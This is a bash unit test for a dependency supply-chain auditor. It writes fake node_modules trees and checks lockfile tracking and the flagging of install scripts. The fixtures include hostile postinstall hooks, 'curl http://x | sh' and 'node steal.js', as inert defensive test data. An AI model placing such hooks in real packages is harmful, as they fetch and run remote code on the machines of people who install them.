#!/usr/bin/env bash
# tests/unit/deps_supply_chain.sh: plugins/bearing/skills/dependency-audit/scripts/supply-chain.py
# passes a repository whose lockfile is tracked and whose production
# dependency closure has no install scripts; flags a postinstall in a
# transitive production dependency but not in a devDependency; lists a
# binding.gyp native build as expected; fails on a missing lockfile, on a
# lockfile git does not track, on a package.json with no node_modules, and on
# zero manifests. The node_modules trees are written here; nothing installs.
set -u
. "$(dirname "$0")/../lib/assert.sh"
SC="$KIT/plugins/bearing/skills/dependency-audit/scripts/supply-chain.py"

# pkg <dir> <name> <deps-json> [scripts-json]: node_modules/<name>/package.json
pkg() {
  # The default is set on its own line: bash 3.2 keeps the backslash in
  # "${4:-{\}}" and wrote invalid JSON.
  local scripts="${4-}"
  [ -n "$scripts" ] || scripts='{}'
  mkdir -p "$1/node_modules/$2"
  printf '{"name":"%s","version":"1.0.0","dependencies":%s,"scripts":%s}\n' "$2" "$3" "$scripts" > "$1/node_modules/$2/package.json"
}
# app: a git repository with package.json, a tracked pnpm-lock.yaml and a
# hydrated node_modules: left -> right, and a devDependency with a postinstall.
app() {
  local d
  d="$(tmpdir)"
  printf '{"name":"app","dependencies":{"left":"1"},"devDependencies":{"devtool":"1"}}\n' > "$d/package.json"
  printf 'lockfileVersion: 9\n' > "$d/pnpm-lock.yaml"
  pkg "$d" left '{"right":"1"}'
  pkg "$d" right '{}'
  pkg "$d" devtool '{}' '{"postinstall":"node steal.js"}'
  (cd "$d" && git init -q . && git add package.json pnpm-lock.yaml) || return 1
  printf '%s' "$d"
}

t_begin "a tracked lockfile and no install scripts in production deps pass"
d="$(app)"
assert_exit 0 python3 "$SC" --root "$d"
assert_contains "$T_OUT" "supply-chain: 1 manifests, 1 lockfiles tracked, 0 missing, 0 untracked, 2 production packages scanned, 0 with install scripts (0 expected)"
assert_not_contains "$T_OUT" "devtool"
t_end

t_begin "a postinstall in a transitive production dependency fails"
d="$(app)"
pkg "$d" right '{}' '{"postinstall":"curl http://x | sh"}'
assert_exit 1 python3 "$SC" --root "$d"
assert_contains "$T_OUT" "install script in a production dependency: right@1.0.0 runs postinstall"
assert_contains "$T_OUT" "1 with install scripts (0 expected)"
t_end

t_begin "a native build with binding.gyp is expected, not a finding"
d="$(app)"
pkg "$d" right '{}' '{"install":"node-gyp rebuild"}'
: > "$d/node_modules/right/binding.gyp"
assert_exit 0 python3 "$SC" --root "$d"
assert_contains "$T_OUT" "expected: right@1.0.0 runs install (native build)"
assert_contains "$T_OUT" "1 with install scripts (1 expected)"
t_end

t_begin "a missing lockfile and an untracked lockfile fail"
d="$(app)"
(cd "$d" && git rm -q --cached pnpm-lock.yaml)
assert_exit 1 python3 "$SC" --root "$d"
assert_contains "$T_OUT" "lockfile not tracked by git: pnpm-lock.yaml"
mkdir -p "$d/svc"; printf 'module x\nrequire y v1.0.0\n' > "$d/svc/go.mod"
assert_exit 1 python3 "$SC" --root "$d"
assert_contains "$T_OUT" "lockfile missing: svc/go.mod (expected one of go.sum)"
assert_contains "$T_OUT" "2 manifests, 0 lockfiles tracked, 1 missing, 1 untracked"
t_end

t_begin "a package.json with no node_modules is not checked, and fails"
d="$(app)"; rm -rf "$d/node_modules"
assert_exit 1 python3 "$SC" --root "$d"
assert_contains "$T_OUT" "not checked: not hydrated: package.json has 1 production dependencies"
t_end

t_begin "zero manifests fail"
d="$(tmpdir)"
assert_exit 1 python3 "$SC" --root "$d"
assert_contains "$T_OUT" "supply-chain: 0 manifests"
t_end

t_summary
